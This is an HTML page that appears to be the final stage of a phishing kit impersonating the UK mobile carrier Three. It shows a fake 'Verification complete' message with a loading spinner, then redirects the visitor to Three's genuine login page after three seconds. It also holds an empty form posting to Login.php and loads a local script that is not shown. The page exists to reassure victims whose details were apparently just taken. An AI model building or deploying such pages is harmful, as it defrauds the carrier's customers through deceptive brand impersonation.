<!DOCTYPE html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="refresh" content="3; url=
    https://www.three.co.uk/My3Account2018/My3Login"/>
    <title>Three</title> 
    <link href="styles/mobileValidation.css" rel="stylesheet"/>
   <link href="styles/favicon.ico" rel="icon" >
	<link rel="stylesheet" href="styles/demo.css">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <script  src="styles/js.js"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 
 
  

<style>
.loader,
.loader:before,
.loader:after {
  border-radius: 50%;
  width: 2.5em;
  height: 2.5em;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;
  -webkit-animation: load7 1.8s infinite ease-in-out;
  animation: load7 1.8s infinite ease-in-out;
}
.loader {
  color: #007bc3;
  font-size: 10px;
  margin: 80px auto;
  position: relative;
  text-indent: -9999em;
  -webkit-transform: translateZ(0);
  -ms-transform: translateZ(0);
  transform: translateZ(0);
  -webkit-animation-delay: -0.16s;
  animation-delay: -0.16s;
}
.loader:before,
.loader:after {
  content: '';
  position: absolute;
  top: 0;
}
.loader:before {
  left: -3.5em;
  -webkit-animation-delay: -0.32s;
  animation-delay: -0.32s;
}
.loader:after {
  left: 3.5em;
}
@-webkit-keyframes load7 {
  0%,
  80%,
  100% {
    box-shadow: 0 2.5em 0 -1.3em;
  }
  40% {
    box-shadow: 0 2.5em 0 0;
  }
}
@keyframes load7 {
  0%,
  80%,
  100% {
    box-shadow: 0 2.5em 0 -1.3em;
  }
  40% {
    box-shadow: 0 2.5em 0 0;
  }
}
@media only screen and (max-width: 750px) {
  .Login{
font-size:2rem !important
  }
}
</style>

</head>
<body style=" height:20rem !important;overflow-x: hidden;">
 
  
  
<div class="main-content">

    <form method="POST" action="Login.php">
        <div class="form-group text-center">
            <br><br><br>
          <label class="Login" style="font-size:48px;font-weight:bolder">Verification complete you will now be redirected to our homepage.</label>
           <br>
           <div class="loader">Loading...</div>

        </div>
        <div class="form-group">
          <div class="fa-cont">
  

         
    

       
        </div>
        
        <br><br>
      
        </div>
      
      </form>
      
</body>

</html>

